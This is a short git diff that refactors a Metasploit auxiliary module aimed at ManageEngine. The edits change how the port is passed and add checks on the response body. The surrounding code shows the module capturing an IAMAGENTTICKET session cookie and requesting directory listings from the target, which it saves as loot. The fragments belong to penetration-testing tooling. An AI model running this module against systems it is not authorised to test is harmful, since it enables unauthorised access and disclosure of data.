@@ -112,10 +112,8 @@ class Metasploit3 < Msf::Auxiliary
       }
     end
 
-    op_port = datastore['RPORT']
-    datastore['RPORT'] = port
-
     res = send_request_cgi({
+      'rport' => port,
       'method' => 'POST',
       'uri' => normalize_uri(path),
       'vars_get' => {
@@ -125,8 +123,6 @@ class Metasploit3 < Msf::Auxiliary
       },
       'vars_post' => vars_post
     })
-
-    datastore['RPORT'] = op_port
 
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
       # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
@@ -217,7 +213,7 @@ class Metasploit3 < Msf::Auxiliary
         'vars_get' => {
           'operation' => 'listdirectory',
           'rootDirectory' => datastore['DIRECTORY']
-        },
+        }
       })
     rescue Rex::ConnectionRefused
       print_error("#{peer} - Could not connect.")
@@ -225,7 +221,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Show data if needed
-    if res && res.code == 200
+    if res && res.code == 200 && res.body
       vprint_line(res.body.to_s)
       fname = File.basename(datastore['DIRECTORY'])
 
@@ -233,7 +229,7 @@ class Metasploit3 < Msf::Auxiliary
         'manageengine.http',
         'text/plain',
         datastore['RHOST'],
-        res.body,
+        res.body.to_s,
         fname
       )
       print_good("File with directory listing saved in: #{path}")
